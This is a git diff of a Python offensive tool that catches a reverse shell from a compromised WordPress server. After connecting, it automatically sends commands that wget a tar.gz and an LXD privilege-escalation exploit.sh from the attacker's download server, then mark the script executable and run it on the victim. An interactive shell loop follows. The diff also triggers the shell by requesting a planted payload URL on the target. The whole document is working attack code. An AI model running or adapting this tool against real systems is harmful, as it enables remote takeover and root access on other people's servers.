@@ -1,10 +1,8 @@
 import socket, sys, time, os, requests, datetime, re, random, errno
 import threading
 
-def listen(ip,port, t2, r_port):
+def listen(ip,port, t2, r_port, file_name):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	if check_port(ip, port):
-		sys.exit('Port Already in use')
 	s.bind((ip, port))
 	s.listen(1)
 	print("Listening on port " + str(port))
@@ -16,28 +14,36 @@ def listen(ip,port, t2, r_port):
 	print('=================================================')
 	print('$', end=" ") # The shell does not print the first $, so in order not to confuse the user I decided to print it
 	try:
-		t2.start() # This thread will be daemon, however it will close once the main thread closes, so we don't run into the problem of keeping it always on
+		
+		t2.start() # This threads will be daemon, however they will close once the main thread closes, so we don't run into the problem of keeping it always on
 		print('[+] Download Server online on {ip}:{port}'.format(ip=ip, port=r_port))
 		print('[+] Waiting for connection')
 		time.sleep(0.5)
-		#ans = conn.recv(1024).decode()
-		#command = '''
-		#cd /srv/www/wordpress
-		#curl {ip}:{r_port} --output {r_port}_file.tar.gz
-		#'''
-		#conn.send(command.encode())
-		#time.sleep(1)
-		#sys.stdout.write("\033[A" + ans.split("\n")[-1])
+		commands = ['cd /srv/www/wordpress\n', 'wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name), 
+		'wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port), 'chmod 755 ./exploit.sh\n', './exploit.sh -f {r_port}_file.tar.gz\n'.format(r_port = r_port),'whoami\n'] #'rm -f {r_port}_file.tar.gz exploit.sh\n'.format(r_port=r_port)]
+		for cmd in commands:
+			s.settimeout(3.0)
+			ans = conn.recv(32768).decode()
+			s.settimeout(None) # Prevent the socket from locking in case there's no output
+			sys.stdout.write(ans)
+			conn.send(cmd.encode())
+			time.sleep(0.2)
+			sys.stdout.write("\033[A" + ans.split("\n")[-1])
+
 		while True:
+			print('In loop')
 			#Receive data from the target and get user input
-			ans = conn.recv(1024).decode()
+			s.settimeout(3.0)
+			ans = conn.recv(32768).decode()
+			s.settimeout(None) # Prevent the socket from locking in case there's no output
 			sys.stdout.write(ans)
 			command = input()
 
 			#Send command
 			command += "\n"
 			conn.send(command.encode())
-			time.sleep(1)
+			time.sleep(0.2)
+			sys.stdout.write(ans)
 
 		#	#Remove the output of the "input()" function
 			sys.stdout.write("\033[A" + ans.split("\n")[-1])
@@ -46,34 +52,47 @@ def listen(ip,port, t2, r_port):
 		if conn:
 			print('\n[-] Unbinding...')
 			conn.close()
+			s.close()
 	conn.close()
         
 def listen_shell(ip, port, v_ip, v_port):
+	if check_port(ip, int(port)):
+		print('[-] Port Already in use')
+		print('[-] If this is not the first time you execute this script it might be')
+		print('[-] because the TIME_WAIT of the port hasn\'t passed, please wait a bit')
+		print('[-] before executing again or change the port. (sudo netstat -anpe | grep 4444) to check if the port is im TIME_WAIT')
+		sys.exit()
 	r_port = random.randint(1024, 65536)
 	# Making sure the random port is not in use
 	while check_port(ip, r_port):
 		r_port = random.randint(1024, 65536)
 		
 	t1 = threading.Thread(target=task, args=(v_ip, v_port))
-	t2 = threading.Thread(target=task2, args=(ip, r_port), daemon=True)
+	t2 = threading.Thread(target=task2, args=(ip, r_port))
 	t1.start()
-	listen(ip, int(port), t2, r_port)
+	listen(ip, int(port), t2, r_port, get_file_name())
 	
 def task(v_ip, v_port):
 
-	time.sleep(0.5)
+	time.sleep(1)
 	now = datetime.datetime.now()
 	print('[*] Executing Thread for HTTP Request')
 	if os.path.exists('./tmp_file_with_dest_url.txt'):
 		f = open('./tmp_file_with_dest_url.txt', 'r')
 		url = 'http://' + v_ip + ':' + str(v_port) + str(f.readline()).replace('\n', '')
-		print('[*] Making request to execute reverse shell, verify your listener')
+		print('[*] Making request to execute reverse shell ', url)
 		# Make the timeout very low in order not to wait for response
 		# Make the exception pass so that the user does not get an error 
 		try:
-	    		requests.get(url, timeout=0.0000000001)
+	    		requests.get(url, timeout=(1, 1))
 		except requests.exceptions.ReadTimeout: 
-	    		pass
+	    		print('[-] Timed Out, check if the website is up')
+	    		print('[*] If it is, access: ', url)
+	    		print('[+] That should initiate the connection')
+	    		
+		except requests.exceptions.ConnectTimeout:
+	    		sys.exit('[-] We couldn\'t find the exploit in the victim server, check if the server is alive')
+	    		 
 		os.remove('./tmp_file_with_dest_url.txt')
 		print('[*] The exact time before lauching the exploit was: ', now)
 		print('[*] You can use this time to help you filter the syscall logs')
@@ -85,10 +104,9 @@ def task(v_ip, v_port):
 		
 		sys.exit()
 		
-# This will invoke the a server to download the file that is going to be executed on the victim
+# This will invoke the a server to download files, used to pass both the exploit and the tar.gz file
 def task2(ip, r_port):
-	file_name = get_file_name() # Searchs for the file, since it adds the time of compilation onto its name
-	os.system('python3 ./Privilege_Escalation_LXD/file_download_server.py ./{file_name} {r_port}'.format(file_name=file_name, r_port=r_port))
+	os.system('python3 ./Privilege_Escalation_LXD/file_download_server.py {r_port}'.format(r_port=r_port))
 	
 def check_port(ip, port):
 
@@ -116,3 +134,4 @@ def get_file_name():
 		# if match is found
 		if match:
 			return file
+
